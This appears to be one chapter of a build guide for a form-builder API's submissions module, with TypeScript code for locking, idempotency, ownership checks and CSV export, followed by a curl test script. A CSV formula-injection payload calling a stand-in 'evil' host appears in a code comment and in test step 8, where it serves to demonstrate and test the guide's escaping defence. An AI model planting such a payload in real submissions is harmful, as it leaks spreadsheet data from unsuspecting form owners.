# 17 — Submissions module

## Why

Six endpoints: two public (PRD §12 "Public — 2") and four private ("Private submissions — 4"). This is the most
constraint-dense module in the PRD, because the public POST is an unauthenticated write endpoint exposed to the
internet.

The requirements that shape the design:

> Use a transaction and form row lock, or equivalent ordering, so publication/unpublish/delete cannot race response
> acceptance. Store the exact validated snapshot with the response. (§8)

> Support optional Idempotency-Key scoped to form for 24 hours. (§8)

> Register export before dynamic submission-detail routes. (§12)

> CSV export … Escape quotes/newlines/delimiters and neutralize spreadsheet formula injection. (§9)

## The endpoints

| Method | Path | Auth |
|---|---|---|
| GET | `/public/forms/:slug` | public |
| POST | `/public/forms/:slug/submissions` | public |
| GET | `/forms/:formId/submissions` | owner |
| GET | `/forms/:formId/submissions/export` | owner |
| GET | `/forms/:formId/submissions/:submissionId` | owner |
| DELETE | `/forms/:formId/submissions/:submissionId` | owner |

## 1. Route order

PRD §12 ends with a sentence that is easy to skip:

> Register export before dynamic submission-detail routes.

```ts
@Controller('forms/:formId/submissions')
export class SubmissionsController {
  @Get()
  async list() {}

  // MUST come before @Get(':submissionId'). Express matches in
  // declaration order, so a later static route is unreachable — 'export'
  // would be captured as a submissionId, fail UUID validation, and the
  // export endpoint would 400 forever with no obvious cause.
  @Get('export')
  async export() {}

  @Get(':submissionId')
  async findOne() {}

  @Delete(':submissionId')
  async remove() {}
}
```

## 2. The public read

```ts
// src/modules/submissions/public-forms.controller.ts
@ApiTags('Public')
@Controller('public/forms')
export class PublicFormsController {
  @Public()
  @Get(':slug')
  @ApiOperation({ summary: 'Published renderer data' })
  async getPublished(@Param('slug') slug: string): Promise<PublicFormDto> {
    return this.submissions.getPublishedForm(slug);
  }
}
```

```ts
async getPublishedForm(slug: string): Promise<PublicFormDto> {
  const form = await this.forms.findOne({
    where: { slug, status: FormStatus.PUBLISHED },
  });

  // PRD §8: "Unknown, unpublished or deleted forms return generic not
  // found." One message for all three — otherwise the response reveals
  // that a form exists but is unpublished.
  if (!form?.publishedSnapshot) {
    throw new NotFoundError('Form not found');
  }

  const snapshot = form.publishedSnapshot;

  // PRD §8: "Do not return owner email, sessions or response data."
  // Built explicitly field by field — returning the entity would expose
  // userId, draftSchema and every draft the owner has not published.
  return {
    slug: form.slug,
    publicationVersion: form.publicationVersion,
    title: snapshot.title,
    description: snapshot.description,
    fields: snapshot.fields,
    submitText: snapshot.submitText,
    successMessage: snapshot.successMessage,
  };
}
```

## 3. The public submission

This is the endpoint everything else protects. PRD §8 in full force:

```ts
// src/modules/submissions/dto/create-submission.dto.ts
export class CreateSubmissionDto {
  /** PRD §11 / §8: the version the respondent's page was rendered from. */
  @Type(() => Number)
  @IsInt()
  @Min(1)
  publicationVersion: number;

  /**
   * Deliberately `unknown`-shaped. A @ValidateNested DTO cannot express a
   * form whose fields are only known at runtime — PRD §11: "validating
   * only that answers is an object is insufficient." The schema-driven
   * validator from doc 16 does the real work.
   */
  @IsObject()
  answers: Record<string, unknown>;

  /** PRD §8: honeypot. Rendered hidden; a human never fills it. */
  @IsOptional()
  @IsString()
  @MaxLength(100)
  honeypot?: string;
}
```

```ts
async submit(
  slug: string,
  dto: CreateSubmissionDto,
  idempotencyKey?: string,
): Promise<SubmissionReceiptDto> {
  return this.dataSource.transaction(async (manager) => {
    // PRD §8: "Use a transaction and form row lock … so
    // publication/unpublish/delete cannot race response acceptance."
    //
    // Doc 15's publish() takes the same lock, so a publish and a
    // submission serialize: whichever gets the lock first completes, and
    // the second sees the other's committed state.
    const form = await manager
      .createQueryBuilder(Form, 'form')
      .where('form.slug = :slug', { slug })
      .setLock('pessimistic_write')
      .getOne();

    // Checked INSIDE the lock. Checking before taking it would leave a
    // window in which an unpublish commits between check and insert.
    if (!form || form.status !== FormStatus.PUBLISHED || !form.publishedSnapshot) {
      throw new NotFoundError('Form not found');
    }

    // PRD §8: honeypot matches "produce no stored response and a generic
    // success-like reply". Returning an error would tell the bot it was
    // detected; this teaches it nothing.
    if (isHoneypotTriggered(dto.honeypot, form.id)) {
      return {
        id: randomUUID(),
        submittedAt: new Date().toISOString(),
        message: form.publishedSnapshot.successMessage,
      };
    }

    // PRD §8: "configurable form-wide abuse ceiling" (doc 11).
    if (!this.ceiling.consume(form.id)) {
      throw new DomainException(
        ErrorCode.RATE_LIMITED,
        HttpStatus.TOO_MANY_REQUESTS,
        'This form is receiving too many submissions right now.',
      );
    }

    // --- Idempotency (PRD §8) ---
    const payloadHash = this.hashPayload(dto);
    let idempotencyRecord: SubmissionIdempotency | null = null;

    if (idempotencyKey) {
      const keyHash = this.crypto.hashToken(idempotencyKey);
      idempotencyRecord = await manager.findOne(SubmissionIdempotency, {
        where: { formId: form.id, keyHash },
        relations: ['submission'],
      });

      if (idempotencyRecord && idempotencyRecord.expiresAt > new Date()) {
        // "same key/payload returns previous success"
        if (idempotencyRecord.payloadHash === payloadHash && idempotencyRecord.submission) {
          return {
            id: idempotencyRecord.submission.id,
            submittedAt: idempotencyRecord.submission.createdAt.toISOString(),
            message: form.publishedSnapshot.successMessage,
          };
        }
        // "changed payload returns 409"
        throw new IdempotencyConflictError();
      }
    }

    // PRD §8: "Stale publicationVersion returns 409 FORM_CHANGED."
    // Checked after idempotency so a legitimate retry of an accepted
    // submission still succeeds across a republish.
    if (dto.publicationVersion !== form.publicationVersion) {
      throw new FormChangedError(form.publicationVersion);
    }

    // PRD §8: "validates every answer against the current snapshot" (doc 16).
    const outcome = this.validator.validate(
      form.publishedSnapshot.fields,
      dto.answers,
    );

    // PRD §8/§12: "Invalid answers return 422 with field-level errors."
    if (!outcome.valid) throw new AnswerValidationError(outcome.errors);

    // PRD §8: "Store the exact validated snapshot with the response."
    // §7: this is what preserves old labels and options after republishing.
    const submission = await manager.save(
      manager.create(Submission, {
        formId: form.id,
        answers: outcome.answers,
        schemaSnapshot: {
          schemaVersion: 1,
          title: form.publishedSnapshot.title,
          fields: form.publishedSnapshot.fields,
        },
        publicationVersion: form.publicationVersion,
      }),
    );

    if (idempotencyKey) {
      await manager.save(
        manager.create(SubmissionIdempotency, {
          formId: form.id,
          keyHash: this.crypto.hashToken(idempotencyKey),
          payloadHash,
          submissionId: submission.id,
          // PRD §8: 24 hours.
          expiresAt: new Date(Date.now() + 24 * 60 * 60 * 1000),
        }),
      );
    }

    // PRD §8: "Success returns 201 with response ID, timestamp and
    // success message, granting no private read access." The ID is a
    // receipt, not a key — GET /forms/:id/submissions/:id requires
    // ownership.
    return {
      id: submission.id,
      submittedAt: submission.createdAt.toISOString(),
      message: form.publishedSnapshot.successMessage,
    };
  });
}

/** Stable across key ordering, so a re-serialized retry still matches. */
private hashPayload(dto: CreateSubmissionDto): string {
  const canonical = JSON.stringify({
    publicationVersion: dto.publicationVersion,
    answers: sortKeysDeep(dto.answers),
  });
  return createHash('sha256').update(canonical).digest('hex');
}
```

Two ordering decisions inside that transaction are load-bearing:

- **Publication state is checked after the lock, not before.** A check-then-lock leaves a window for an unpublish to
  commit in between. PRD §8 calls this out as a race that must not be possible.
- **Idempotency is checked before the version check.** A client retrying a request that already succeeded should get
  the original receipt, even if a republish happened in the meantime — the submission was accepted under the old
  version, and the retry is not a new submission.

The controller:

```ts
@Public()
@Post(':slug/submissions')
@HttpCode(HttpStatus.CREATED)
@UseGuards(SubmissionThrottlerGuard)        // PRD §8, doc 11
@ApiOperation({ summary: 'Anonymous validated submission' })
@ApiPublicSubmissionErrors()
async submit(
  @Param('slug') slug: string,
  @Body() dto: CreateSubmissionDto,
  // PRD §11: the key is never logged — doc 04 redacts 'idempotencykey'.
  @Headers('idempotency-key') idempotencyKey?: string,
): Promise<SubmissionReceiptDto> {
  return this.submissions.submit(slug, dto, idempotencyKey);
}
```

## 4. Owner-side reads

PRD §3 extends the ownership rule to nested routes:

> Nested response operations verify `(form_id, response_id)` and ownership of the parent form.

```ts
/**
 * One query joining through the form, so ownership and the parent/child
 * relationship are both in the predicate. A submission ID from another
 * user's form simply does not match.
 */
private ownedSubmissionQuery(formId: string, userId: string) {
  return this.submissions
    .createQueryBuilder('submission')
    .innerJoin('submission.form', 'form')
    .where('submission.form_id = :formId', { formId })
    .andWhere('form.user_id = :userId', { userId });
}

async findAll(formId: string, userId: string, query: SubmissionQueryDto) {
  // Confirms the form exists and is owned, so an empty list for a
  // non-existent form is a 404 rather than a misleading empty page.
  await this.forms.findOwned(formId, userId);

  const qb = this.ownedSubmissionQuery(formId, userId);

  // PRD §9: "UTC date filters".
  if (query.from) qb.andWhere('submission.created_at >= :from', { from: query.from });
  if (query.to) qb.andWhere('submission.created_at <= :to', { to: query.to });

  // PRD §9: "submitted-time ordering", allowlisted (doc 10).
  for (const [column, direction] of Object.entries(query.orderBy)) {
    qb.addOrderBy(`submission.${column}`, direction);
  }

  qb.skip(query.skip).take(query.take);

  return PaginatedDto.from(await qb.getManyAndCount(), query).map(
    SubmissionListItemDto.from,
  );
}

async findOne(formId: string, submissionId: string, userId: string) {
  const submission = await this.ownedSubmissionQuery(formId, userId)
    .andWhere('submission.id = :submissionId', { submissionId })
    .getOne();

  // PRD §3: a valid submission ID belonging to another user's form, or
  // belonging to a different form of this user, is a 404 either way.
  if (!submission) throw new NotFoundError('Response not found');

  // PRD §9: "Detail uses the stored snapshot for human-readable
  // labels/options" — so a label renamed after submission still renders
  // as it was when answered.
  return SubmissionDetailDto.from(submission);
}

/** PRD §9: "Owner may delete one response after confirmation." */
async remove(formId: string, submissionId: string, userId: string): Promise<void> {
  // Ownership in the DELETE predicate itself, via a subquery on forms —
  // PRD §3: "not only an earlier lookup".
  const result = await this.submissions
    .createQueryBuilder()
    .delete()
    .where('id = :submissionId', { submissionId })
    .andWhere('form_id = :formId', { formId })
    .andWhere(
      'form_id IN (SELECT id FROM forms WHERE id = :formId AND user_id = :userId)',
      { formId, userId },
    )
    .execute();

  if (result.affected === 0) throw new NotFoundError('Response not found');
}
```

PRD §9's note on counting follows from this: *"Response count is retained submissions, so deletion decreases it."* The
count in doc 15's list is a live `COUNT`, not a stored counter, so this is automatic.

## 5. CSV export

PRD §9 is the densest paragraph in the document. Each requirement maps to a line of code:

```ts
// src/modules/submissions/csv-export.service.ts
import { Injectable } from '@nestjs/common';
import { Readable } from 'node:stream';
import { Submission } from './entities/submission.entity';
import { FormField } from '../forms/types/form-schema.types';

@Injectable()
export class CsvExportService {
  /**
   * PRD §9: "Escape quotes/newlines/delimiters and neutralize spreadsheet
   * formula injection."
   *
   * The formula guard is the one a CSV library will not do for you. A cell
   * beginning =, +, - or @ is executed as a formula by Excel, Sheets and
   * LibreOffice on open — so an answer of
   *   =HYPERLINK("http://evil/?"&A1,"Click")
   * exfiltrates the sheet when the form owner opens their export.
   * Prefixing a tab neutralizes it while staying visually identical.
   */
  escapeCell(value: unknown): string {
    if (value === null || value === undefined) return '';

    let text = Array.isArray(value) ? value.join('; ') : String(value);

    if (/^[=+\-@\t\r]/.test(text)) {
      text = `\t${text}`;
    }

    // RFC 4180: a field containing a quote, comma or newline is quoted,
    // and inner quotes are doubled.
    if (/[",\n\r]/.test(text)) {
      text = `"${text.replace(/"/g, '""')}"`;
    }

    return text;
  }

  /**
   * PRD §9: "a union of stable field IDs across snapshots; use readable
   * labels plus short ID suffixes for duplicate labels."
   *
   * The union matters because republishing changes the field set — a
   * submission from version 1 and one from version 3 may have different
   * fields, and both must appear.
   */
  buildColumns(submissions: Submission[]): Array<{ id: string; header: string }> {
    const fieldsById = new Map<string, FormField>();

    for (const submission of submissions) {
      for (const field of submission.schemaSnapshot.fields) {
        // First occurrence wins, so the oldest label is used consistently.
        if (!fieldsById.has(field.id)) fieldsById.set(field.id, field);
      }
    }

    // Disambiguate duplicate labels with a short ID suffix.
    const labelCounts = new Map<string, number>();
    for (const field of fieldsById.values()) {
      labelCounts.set(field.label, (labelCounts.get(field.label) ?? 0) + 1);
    }

    return [...fieldsById.entries()].map(([id, field]) => ({
      id,
      header:
        (labelCounts.get(field.label) ?? 0) > 1
          ? `${field.label} (${id.slice(-6)})`
          : field.label,
    }));
  }

  /**
   * PRD §9: "Translate option IDs using each response snapshot."
   *
   * Per-response, not per-form: if an option was renamed between
   * publications, each response renders with the label that was shown
   * when it was answered.
   */
  private renderAnswer(submission: Submission, fieldId: string): string {
    const value = submission.answers[fieldId];
    if (value === undefined || value === null) return '';

    const field = submission.schemaSnapshot.fields.find((f) => f.id === fieldId);
    if (!field?.options) return this.escapeCell(value);

    const labelFor = (optionId: string) =>
      field.options?.find((o) => o.id === optionId)?.label ?? optionId;

    return this.escapeCell(
      Array.isArray(value) ? value.map(labelFor) : labelFor(String(value)),
    );
  }

  /**
   * PRD §9: "streams output". A 10,000-row export built as one string
   * would be tens of megabytes resident per concurrent export.
   */
  stream(submissions: Submission[]): Readable {
    const columns = this.buildColumns(submissions);

    // PRD §9: "Empty exports include headers."
    const header = [
      'Response ID',
      'Submitted at (UTC)',
      ...columns.map((c) => this.escapeCell(c.header)),
    ].join(',');

    const self = this;
    return Readable.from(
      (function* () {
        yield `${header}\n`;
        for (const submission of submissions) {
          yield [
            submission.id,
            submission.createdAt.toISOString(),
            ...columns.map((c) => self.renderAnswer(submission, c.id)),
          ].join(',') + '\n';
        }
      })(),
    );
  }
}
```

The export endpoint:

```ts
@Get('export')
@ApiOperation({ summary: 'Export CSV' })
@ApiOwnedResourceErrors()
async export(
  @CurrentUser('id') userId: string,
  @Param('formId', UuidParam) formId: string,
  @Query() query: SubmissionQueryDto,
  @Res({ passthrough: true }) res: Response,
): Promise<StreamableFile> {
  const form = await this.forms.findOwned(formId, userId);
  const submissions = await this.submissions.findForExport(formId, userId, query);

  res.set({
    'Content-Type': 'text/csv; charset=utf-8',
    'Content-Disposition': `attachment; filename="${sanitizeFilename(form.title)}.csv"`,
  });

  return new StreamableFile(this.csv.stream(submissions));
}
```

```ts
/** PRD §9: "caps at 10,000 responses. Above that limit return an actionable error." */
async findForExport(formId: string, userId: string, query: SubmissionQueryDto) {
  const qb = this.ownedSubmissionQuery(formId, userId);
  if (query.from) qb.andWhere('submission.created_at >= :from', { from: query.from });
  if (query.to) qb.andWhere('submission.created_at <= :to', { to: query.to });

  const total = await qb.getCount();

  if (total > this.config.csvExportMaxRows) {
    // "actionable" — the message tells the owner how to proceed.
    throw new DomainException(
      ErrorCode.EXPORT_TOO_LARGE,
      HttpStatus.UNPROCESSABLE_ENTITY,
      `This export has ${total} responses, above the ${this.config.csvExportMaxRows} limit. ` +
        'Narrow the date range and export in parts.',
    );
  }

  return qb.orderBy('submission.created_at', 'ASC').getMany();
}
```

The filename comes from a user-controlled title, so it needs sanitizing — a `"` or newline in a title would break out
of the `Content-Disposition` header:

```ts
const sanitizeFilename = (title: string): string =>
  title.replace(/[^\w\- ]/g, '').trim().slice(0, 60) || 'responses';
```

## 6. What is not stored

PRD §9:

> Full respondent IP/user-agent storage is disabled by default. No submission emails or external deliveries exist in
> this release.

The `Submission` entity (doc 12) has no IP or user-agent column, by design. Doc 11's throttler uses the IP in memory
and hashes it into a limiter key; it never reaches the database.

## Verify

```bash
API=localhost:3000/api/v1
# Create and publish a form with text + checkbox fields; capture $ID, $SLUG, $A (owner token).

# 1. Public read returns only safe data (PRD §8)
curl -s $API/public/forms/$SLUG | jq 'keys'
# expected: publicationVersion, title, description, fields, submitText, successMessage, slug
# NOT: userId, draftSchema, user, submissions

# 2. A valid submission
curl -s -X POST $API/public/forms/$SLUG/submissions \
  -H 'content-type: application/json' \
  -d '{"publicationVersion":1,"answers":{"fld_name":"Ada"}}' | jq
# expected: 201 {id, submittedAt, message}

# 3. STALE VERSION → 409 FORM_CHANGED (PRD §8)
curl -s -X POST $API/public/forms/$SLUG/submissions \
  -H 'content-type: application/json' \
  -d '{"publicationVersion":99,"answers":{"fld_name":"Ada"}}' | jq
# expected: {"statusCode":409,"code":"FORM_CHANGED",…}

# 4. Invalid answers → 422 with field errors (PRD §8)
curl -s -X POST $API/public/forms/$SLUG/submissions \
  -H 'content-type: application/json' \
  -d '{"publicationVersion":1,"answers":{"fld_name":"  "}}' | jq
# expected: 422 VALIDATION_FAILED with errors[].field = "fld_name"

# 5. IDEMPOTENCY (PRD §8)
BODY='{"publicationVersion":1,"answers":{"fld_name":"Grace"}}'
R1=$(curl -s -X POST $API/public/forms/$SLUG/submissions \
  -H 'content-type: application/json' -H 'idempotency-key: key-123' -d "$BODY")
R2=$(curl -s -X POST $API/public/forms/$SLUG/submissions \
  -H 'content-type: application/json' -H 'idempotency-key: key-123' -d "$BODY")
[ "$(echo $R1 | jq -r .id)" = "$(echo $R2 | jq -r .id)" ] && echo "SAME ID — correct"
docker compose exec postgres psql -U openform -d openform \
  -c "select count(*) from submissions where answers->>'fld_name' = 'Grace';"
# expected: 1 — stored once (PRD §15: "Concurrent submission retries store once")

# Same key, different payload → 409
curl -s -X POST $API/public/forms/$SLUG/submissions \
  -H 'content-type: application/json' -H 'idempotency-key: key-123' \
  -d '{"publicationVersion":1,"answers":{"fld_name":"Someone else"}}' | jq -r .code
# expected: IDEMPOTENCY_CONFLICT

# 6. UNPUBLISH RACE (PRD §8, §15)
curl -s -X POST $API/forms/$ID/unpublish -H "authorization: Bearer $A" > /dev/null
curl -s -X POST $API/public/forms/$SLUG/submissions \
  -H 'content-type: application/json' -H 'idempotency-key: key-123' \
  -d "$BODY" | jq -r .code
# expected: NOT_FOUND — PRD §8: "Unpublished/deleted forms remain
# unavailable even when retrying a prior key."

# 7. HISTORICAL SNAPSHOTS SURVIVE REPUBLISHING (PRD §7, §15)
# Republish with the option label "A" renamed to "Alpha", then:
curl -s "$API/forms/$ID/submissions/$OLD_SUB_ID" -H "authorization: Bearer $A" \
  | jq '.answers'
# expected: the OLD label "A" — rendered from the stored snapshot

# 8. CSV ESCAPING AND FORMULA INJECTION (PRD §9) — the critical export test
curl -s -X POST $API/public/forms/$SLUG2/submissions \
  -H 'content-type: application/json' \
  -d '{"publicationVersion":1,"answers":{"fld_name":"=HYPERLINK(\"http://evil\",\"Click\")"}}'
curl -s -X POST $API/public/forms/$SLUG2/submissions \
  -H 'content-type: application/json' \
  -d '{"publicationVersion":1,"answers":{"fld_name":"Smith, \"Bob\"\nsecond line"}}'

curl -s "$API/forms/$ID2/submissions/export" -H "authorization: Bearer $A" | cat -A | head
# expected: the formula cell begins with ^I (a tab) before the =
# expected: the comma/quote/newline cell is wrapped in quotes with "" doubling

# 9. Empty export still has headers (PRD §9)
curl -s "$API/forms/$EMPTY_FORM/submissions/export" -H "authorization: Bearer $A"
# expected: one header line, no data rows

# 10. ROUTE ORDER (PRD §12)
curl -s -o /dev/null -w '%{http_code}\n' "$API/forms/$ID/submissions/export" \
  -H "authorization: Bearer $A"
# expected: 200 — a 400 here means :submissionId captured "export"

# 11. CROSS-USER ACCESS, including MIXED parent/child IDs (PRD §3, §15)
# $B is a second user's token; $OTHER_FORM is a form Bob owns.
curl -s -o /dev/null -w 'list     %{http_code}\n' "$API/forms/$ID/submissions" -H "authorization: Bearer $B"
curl -s -o /dev/null -w 'detail   %{http_code}\n' "$API/forms/$ID/submissions/$SUB" -H "authorization: Bearer $B"
curl -s -o /dev/null -w 'export   %{http_code}\n' "$API/forms/$ID/submissions/export" -H "authorization: Bearer $B"
curl -s -o /dev/null -w 'delete   %{http_code}\n' -X DELETE "$API/forms/$ID/submissions/$SUB" -H "authorization: Bearer $B"
# expected: 404 on all four

# The mixed-ID case: Ada's own form ID, but a submission ID from Bob's form.
curl -s -o /dev/null -w 'mixed    %{http_code}\n' \
  "$API/forms/$ID/submissions/$BOBS_SUBMISSION_ID" -H "authorization: Bearer $A"
# expected: 404 — the (form_id, submission_id) pair must BOTH match

# 12. Deletion decreases the count (PRD §9)
curl -s "$API/forms" -H "authorization: Bearer $A" | jq '.items[0].submissionCount'
curl -s -X DELETE "$API/forms/$ID/submissions/$SUB" -H "authorization: Bearer $A"
curl -s "$API/forms" -H "authorization: Bearer $A" | jq '.items[0].submissionCount'
# expected: decreased by one

# 13. Answers are never logged (PRD §14)
docker compose logs api 2>&1 | grep -E 'Ada|Grace|HYPERLINK'
# expected: no output — doc 04 redacts the 'answers' key

# 14. The catalogue is complete
curl -s localhost:3000/api/docs-json | jq '[.paths[] | keys[]] | length'
# expected: 25
```

Steps 8 and 11 are the two to run carefully. Step 8 is PRD §15's *"CSV escaping/formula protection"* test — and the
formula case is a real exfiltration vector against the form owner, not a theoretical one. Step 11's mixed-ID case is
the one a naive implementation fails: checking only that the submission exists, or only that the form is owned,
passes the other four lines and fails this one.

## If you skip this

The product does not exist — this is the endpoint the entire register-to-export journey terminates in.

---

Previous: [16 — Validation](./16-validation.md) · Next: [18 — Testing](./18-testing.md)
